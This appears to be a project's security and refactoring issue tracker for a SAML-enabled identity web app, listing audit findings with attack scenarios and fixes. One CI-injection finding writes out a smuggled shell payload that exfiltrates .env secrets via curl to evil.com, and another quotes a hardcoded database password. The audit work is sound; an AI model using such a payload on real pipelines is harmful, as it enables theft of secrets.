# Issues

This file tracks quality issues found by the tester agent. The goal is to keep this file empty.

For resolved issues, see [ISSUES_ARCHIVE.md](ISSUES_ARCHIVE.md).

---

# Summary

| Severity | Count | Categories |
|----------|-------|------------|
| High | 0 | |
| Medium | 7 | Auth, Input Validation, Deployment, SAML |
| Low | 8 | Rate Limiting, Config, Input Validation |
| Medium | 1 | File Structure (pre-existing) |
| Low | 1 | Duplication (pre-existing) |

**Last security scan:** 2026-04-11 (broad: all code from last 30 days, all OWASP categories)
**Last compliance scan:** 2026-03-19 (1 low: SendGrid client missing timeout)
**Last dependency audit:** 2026-02-23 (all clear; werkzeug upgraded to 3.1.6, pip upgraded to 26.0.1)
**Last refactor scan:** 2026-03-21 (standard: new code since 2026-02-27, all categories; 5 new issues)
**Last router refactor:** 2026-02-06 (all 4 large routers split into packages)
**Last service refactor:** 2026-03-21 (settings.py split into package, branding routes extracted, logo duplication removed)
**Last test code audit:** 2026-04-09 (test hygiene audit: removed 21 redundant tests, fixed 6 weak assertions)
**Last copy review:** 2026-04-09 (GCM encryption feature, SAML error page, role display audit)

---

## [SECURITY] User Enumeration: Unauthenticated check-email API without rate limiting

**Found in:** `app/routers/api/v1/saml.py:753-786`
**Severity:** Medium
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**Description:** `POST /api/v1/saml/auth/check-email` is unauthenticated and has no rate limiting. It returns distinct `route_type` values (`password`, `idp`, `not_found`, `inactivated`, etc.) that reveal account existence and state. The equivalent web flow at `/login` has rate limiting (30/5min), but this API endpoint bypasses it entirely.
**Attack Scenario:** Automated email enumeration at full speed against the API endpoint.
**Evidence:** No `Depends(...)` for auth or rate limiting on the endpoint. Response distinguishes 8 account states.
**Impact:** Organizational membership disclosure, account state enumeration.
**Remediation:** Add rate limiting matching the web login flow. Consider collapsing response states to reduce information leakage.

---

## [SECURITY] Assertion Replay: No SAML assertion ID cache

**Found in:** `app/services/saml/auth.py:370-420`
**Severity:** Medium
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**Description:** The SAML SP does not maintain an assertion ID replay cache. For IdP-initiated flows, `request_id` is `None` (skipping InResponseTo validation), so a captured SAML response can be replayed freely within the 5-minute `NotOnOrAfter` window. SAML 2.0 recommends SPs track processed assertion IDs to prevent this.
**Attack Scenario:** Attacker captures a valid signed SAML response (from logs, verbose mode, or network interception) and replays it within 5 minutes to create multiple authenticated sessions.
**Evidence:** No assertion ID tracking in `process_saml_response()`. `request_id` is popped from session and may be `None`.
**Impact:** Session hijacking via assertion replay within validity window.
**Remediation:** Store processed assertion IDs in Memcached with a TTL matching the assertion validity window. Reject duplicate IDs.

---

## [SECURITY] Input Validation Bypass: Unvalidated JSON in web bulk primary email route

**Found in:** `app/routers/users/bulk_ops.py:290-327`
**Severity:** Medium
**OWASP Category:** A08:2021 - Software and Data Integrity Failures
**Description:** The web route `POST /bulk-ops/primary-emails/apply` accepts raw `items_json` as a form field, deserializes with `json.loads()`, and passes to the service layer without schema validation. The API equivalent uses `BulkChangePrimaryEmailApplyRequest` Pydantic model. Unexpected keys or missing fields are stored in the database and could cause unhandled exceptions in the worker. The `preview_job_id` form field also has no length constraint (the API schema constrains it to 50 chars).
**Attack Scenario:** Admin submits crafted `items_json` with missing keys or extra payload, causing worker-side KeyError exceptions or bloating job storage.
**Evidence:** `json.loads(items_json)` at line 307 passed directly to `create_bulk_primary_email_apply_task`.
**Impact:** Worker errors, potential storage exhaustion from oversized payloads.
**Remediation:** Validate deserialized items against the same Pydantic schema used by the API endpoint.

---

## [SECURITY] Deployment: Unrestricted on-demand TLS certificate issuance

**Found in:** `deploy/Caddyfile:8-13`
**Severity:** Medium
**OWASP Category:** A05:2021 - Security Misconfiguration
**Description:** The `ask` validation endpoint is commented out. Without it, Caddy issues TLS certificates for any hostname matching the wildcard site block. An attacker can exhaust Let's Encrypt rate limits (50 certs/domain/week), preventing legitimate tenant subdomains from obtaining certificates.
**Attack Scenario:** Attacker creates DNS records pointing to the server with arbitrary subdomains, exhausting rate limits.
**Evidence:** `# ask http://app:8000/caddy/check-domain` is commented out in the Caddyfile.
**Impact:** Denial of service for TLS certificate issuance on legitimate tenant subdomains.
**Remediation:** Implement the `/caddy/check-domain` endpoint that validates subdomains against the tenant database, and uncomment the `ask` directive.

---

## [SECURITY] Deployment: .env created without restrictive permissions

**Found in:** `deploy/install.sh:124`
**Severity:** Medium
**OWASP Category:** A02:2021 - Cryptographic Failures
**Description:** `cat > .env` creates the file with default umask (typically 0644, world-readable). The file contains `SECRET_KEY`, `POSTGRES_PASSWORD`, and SMTP credentials. On a shared server, any local user can read all secrets.
**Attack Scenario:** Local user reads `.env` and obtains `SECRET_KEY` (sufficient to forge sessions and impersonate any user).
**Evidence:** `install.sh:124` uses plain `cat > .env` with no `umask` or `chmod`.
**Impact:** Full secret exposure on shared servers.
**Remediation:** Set `umask 077` before writing `.env`, or `chmod 600 .env` after creation.

---

## [SECURITY] Information Disclosure: Verbose assertion logging stores PII in event log

**Found in:** `app/services/saml/auth.py:39-108`
**Severity:** Medium
**OWASP Category:** A09:2021 - Security Logging and Monitoring Failures
**Description:** When verbose logging is enabled (24-hour window), full raw SAML responses are stored in the debug table (cleaned up after 24h). However, the event log also captures all parsed user attributes (email, name, groups, unmapped attributes) and these persist indefinitely, creating a long-lived PII store.
**Attack Scenario:** Attacker with database read access (backup, log aggregation) obtains detailed PII for every user who authenticated during verbose logging windows.
**Evidence:** Event metadata at `auth.py:82-93` includes email, first_name, last_name, groups, name_id, and all unmapped_attributes.
**Impact:** PII exposure via event log persistence.
**Remediation:** Limit event log metadata to non-PII fields (e.g., IdP name, debug_entry_id, attribute count). Keep PII only in the debug entry (which has 24h TTL).

---

## [SECURITY] Input Validation: Unbounded grace_period_days on certificate rotation

**Found in:** `app/routers/api/v1/saml.py:491-507`
**Severity:** Medium
**OWASP Category:** A04:2021 - Insecure Design
**Description:** The `grace_period_days` query parameter on certificate rotation accepts any integer with no bounds. Values like 999999 make old certs valid indefinitely. Negative values set grace period end dates in the past.
**Attack Scenario:** Compromised super admin token sets `grace_period_days=999999`, keeping a compromised certificate valid for ~2740 years.
**Evidence:** `grace_period_days: int = 7` with no `ge`/`le` constraints. Passed to `timedelta(days=grace_period_days)`.
**Impact:** Undermines certificate rotation security controls.
**Remediation:** Add bounds: `grace_period_days: int = Query(default=7, ge=0, le=90)`.

---

## [SECURITY] Hardcoded Credentials: appuser database password

**Found in:** `db-init/schema.sql:32`, `deploy/docker-compose.yml:36-37`
**Severity:** Low
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**Description:** The `appuser` role password is hardcoded to `apppass` in the schema baseline and deploy compose. The `install.sh` script generates a random password for `postgres` but not for `appuser`.
**Attack Scenario:** Attacker with network access to the database port authenticates as `appuser` with the well-known password.
**Evidence:** `CREATE ROLE appuser LOGIN PASSWORD 'apppass'` in schema.sql.
**Impact:** Full application data access if database port is exposed.
**Remediation:** Generate a random `APPUSER_PASSWORD` in `install.sh` and use it in both the schema and compose file.

---

## [SECURITY] Container Security: Docker containers run as root

**Found in:** `Dockerfile` (no `USER` directive)
**Severity:** Low
**OWASP Category:** A05:2021 - Security Misconfiguration
**Description:** Neither the production nor dev Dockerfile creates a non-root user. All processes (uvicorn, worker, migration) run as root. If RCE is achieved, the attacker has root privileges inside the container.
**Attack Scenario:** Application vulnerability leads to RCE with root privileges, maximizing container escape risk.
**Evidence:** No `USER` or `RUN useradd` directives in either Dockerfile.
**Impact:** Increased blast radius of any RCE vulnerability.
**Remediation:** Add a non-root user and switch to it after installing dependencies.

---

## [SECURITY] Weak Tokens: Predictable sequential nonces for email verification

**Found in:** `db-init/schema.sql:186`, `db-init/migrations/0023_set_password_nonce.sql:7`
**Severity:** Low
**OWASP Category:** A02:2021 - Cryptographic Failures
**Description:** `verify_nonce` and `set_password_nonce` are sequential integers starting at 1. If the UUID `email_id` is leaked (logs, referrer headers), the nonce provides minimal additional security since it's trivially guessable (almost always 1).
**Attack Scenario:** Attacker who obtains an `email_id` UUID can guess the nonce (starts at 1, increments by 1).
**Evidence:** `verify_nonce integer DEFAULT 1 NOT NULL` in schema.sql.
**Impact:** Reduced security of email verification and password-set links if UUID is leaked.
**Remediation:** Use `secrets.token_urlsafe()` instead of sequential integers for nonces.

---

## [SECURITY] Missing Rate Limit: Reactivation request enables email flooding

**Found in:** `app/routers/auth/reactivation.py:87-173`
**Severity:** Low
**OWASP Category:** A04:2021 - Insecure Design
**Description:** `POST /request-reactivation` is unauthenticated, has no rate limiting, and emails all tenant admins on each call. An attacker who knows a valid `user_id` can flood admin inboxes.
**Attack Scenario:** Repeated POST requests with a known user_id trigger unlimited admin notification emails.
**Evidence:** No rate limit call in `request_reactivation`. Emails sent in a loop to all admins.
**Impact:** Email flooding of admin accounts.
**Remediation:** Add rate limiting keyed on IP and user_id.

---

## [SECURITY] CI Injection: GitHub Actions script injection via workflow dispatch

**Found in:** `.github/workflows/e2e-tests.yml:132-136`
**Severity:** Low
**OWASP Category:** A03:2021 - Injection
**Description:** The `test_filter` workflow dispatch input is interpolated with `${{ }}` directly into a shell command without escaping. A collaborator with dispatch permissions could inject arbitrary commands.
**Attack Scenario:** Collaborator sets `test_filter` to `"; curl evil.com/exfil?s=$(cat .env) #` to exfiltrate CI secrets.
**Evidence:** `FILTER="${{ github.event.inputs.test_filter }}"` in the workflow YAML.
**Impact:** CI runner command injection (limited to repo collaborators).
**Remediation:** Use an environment variable instead of direct interpolation: `env: FILTER: ${{ github.event.inputs.test_filter }}` then `"$FILTER"`.

---

## [SECURITY] Information Disclosure: Export encryption password in database

**Found in:** `app/jobs/export_events.py:274-281`, `app/jobs/export_users.py:350-357`
**Severity:** Low
**OWASP Category:** A02:2021 - Cryptographic Failures
**Description:** XLSX encryption passwords are stored in the `bg_tasks.result` JSONB column in plaintext between creation and expiry (24h). Redacted by the cleanup job after expiry.
**Attack Scenario:** Database backup or read access reveals export passwords, allowing decryption of exported PII.
**Evidence:** `"password": encrypted.password` in job result dicts.
**Impact:** Export file decryption if database is compromised.
**Remediation:** Consider encrypting the password at rest using the tenant's derived key, or delivering it via a separate ephemeral channel.

---

## [SECURITY] Input Validation: Missing max_length on BulkUserIdsRequest elements

**Found in:** `app/schemas/api.py:180`
**Severity:** Low
**OWASP Category:** A04:2021 - Insecure Design
**Description:** `BulkUserIdsRequest.user_ids` is `list[str]` with `max_length=10000` on the list, but no `max_length` on individual string elements. 10,000 arbitrarily long strings could exhaust memory during Pydantic validation and bloat the job payload in the database.
**Attack Scenario:** Admin sends 10,000 user IDs of 1MB each, consuming ~10GB of server memory.
**Evidence:** `user_ids: list[str] = Field(..., min_length=1, max_length=10000)` with no per-element constraint.
**Impact:** Memory exhaustion, database bloat.
**Remediation:** Add `max_length=36` to individual elements (UUIDs are 36 chars).

---

## [SECURITY] Input Validation: No email format validation on web bulk secondary emails

**Found in:** `app/routers/users/bulk_ops.py:168-200`
**Severity:** Low
**OWASP Category:** A03:2021 - Injection
**Description:** The web form route accepts `emails` as raw strings without email format validation (unlike the API endpoint which uses `EmailStr`). Malformed strings can be stored as "verified" secondary emails.
**Attack Scenario:** Admin submits non-email strings via the form. They're stored as verified emails in the database.
**Evidence:** `emails: Annotated[list[str], Form()]` with no validation, passed to `add_verified_email()`.
**Impact:** Data integrity issues. Malformed email addresses in user profiles.
**Remediation:** Validate email format before passing to the service layer. Use the same validation as the API endpoint.

---

## [REFACTOR] File Structure: groups/idp.py split candidate at 710 lines

**Found in:** `app/services/groups/idp.py`
**Impact:** Medium
**Category:** File Structure
**Description:** This file handles two distinct concerns: group creation/discovery (create_idp_base_group, get_or_create_idp_group, _ensure_umbrella_relationship, invalidate_idp_groups) and membership management (sync_user_idp_groups, ensure_user_in_base_group, remove_user_from_base_group, move_users_between_idps). At 710 lines with 15 public functions, it's at the limit of maintainability.
**Why It Matters:** The two concerns are intertwined but distinct. Splitting improves traversability and makes each module's purpose clear.
**Deferred reason:** The test suite patches `services.groups.idp.database` as a single mock to intercept calls across both lifecycle and membership functions. Splitting the module would require patching two submodules' `database` references in ~40 test locations, doubling mock boilerplate. The file should be split after refactoring tests to use proper fixtures.
**Suggested Refactoring:** Split into two modules within the existing groups package:
- `idp_lifecycle.py` (~350 lines): group lifecycle and discovery
- `idp_membership.py` (~350 lines): sync, base group membership, cross-IdP moves
**Files Affected:** `app/services/groups/idp.py`, `app/services/groups/__init__.py`, tests

---

## [REFACTOR] Duplication: Tab route pattern repeated 6x in saml_idp/admin.py

**Found in:** `app/routers/saml_idp/admin.py:225-436`
**Impact:** Low
**Category:** Duplication
**Description:** Six tab routes (sp_tab_details, sp_tab_attributes, sp_tab_groups, sp_tab_certificates, sp_tab_metadata, sp_tab_danger) follow an identical pattern: call `_load_sp_common()`, handle errors, build tab-specific context, return template response. The file is at 1089 lines with 33 route handlers.
**Why It Matters:** The repetitive pattern adds bulk, but the file is well-organized with clear section headers. This is low priority because each handler is compact (30-50 lines) and the structure is consistent.
**Accepted:** Each tab has genuinely different context loading logic. A generic helper would need callbacks that add complexity without improving readability. Monitor for further growth.
**Files Affected:** `app/routers/saml_idp/admin.py`

---

